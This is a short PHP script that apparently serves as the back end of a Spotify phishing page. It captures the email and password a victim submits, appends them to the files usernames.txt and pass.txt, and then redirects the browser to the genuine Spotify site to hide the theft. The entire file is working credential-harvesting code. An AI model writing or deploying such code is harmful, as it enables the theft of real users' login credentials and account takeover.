<?php

file_put_contents("usernames.txt", "Spotify Username : " . $email = $_POST['email'] . "\n", FILE_APPEND);
?>
<?php
file_put_contents("pass.txt", "Spotify Password : " . $pass = $_POST['pass'] . "\n", FILE_APPEND);
header('Location: https://www.spotify.com/');
?>
